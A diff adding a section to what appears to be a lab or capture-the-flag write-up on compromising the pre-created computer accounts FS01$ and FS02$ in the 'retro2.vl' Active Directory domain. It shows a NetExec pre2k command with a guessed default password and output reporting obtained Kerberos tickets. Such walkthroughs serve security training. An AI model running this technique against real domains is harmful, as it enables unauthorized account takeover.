@@ -195,3 +195,14 @@ There was nothing in `Temp`
 Since everything about this box is old im thinking i can try the user as the password for the machine accouts
 
 # Compromising `FS01$` and `FS02$` 
+```python
+nxc ldap bln01.retro2.vl -u 'FS01$' -p 'fs01' -M pre2k -k
+LDAP        bln01.retro2.vl 389    BLN01            [*] Windows 7 / Server 2008 R2 Build 7601 (name:BLN01) (domain:retro2.vl) (signing:None) (channel binding:No TLS cert)
+LDAP        bln01.retro2.vl 389    BLN01            [+] retro2.vl\FS01$:fs01 
+PRE2K       bln01.retro2.vl 389    BLN01            Pre-created computer account: FS01$
+PRE2K       bln01.retro2.vl 389    BLN01            Pre-created computer account: FS02$
+PRE2K       bln01.retro2.vl 389    BLN01            [+] Found 2 pre-created computer accounts. Saved to /home/kali/.nxc/modules/pre2k/retro2.vl/precreated_computers.txt
+PRE2K       bln01.retro2.vl 389    BLN01            [+] Successfully obtained TGT for fs01@retro2.vl
+PRE2K       bln01.retro2.vl 389    BLN01            [+] Successfully obtained TGT for fs02@retro2.vl
+PRE2K       bln01.retro2.vl 389    BLN01            [+] Successfully obtained TGT for 2 pre-created computer accounts. Saved to /home/kali/.nxc/modules/pre2k/ccache
+```
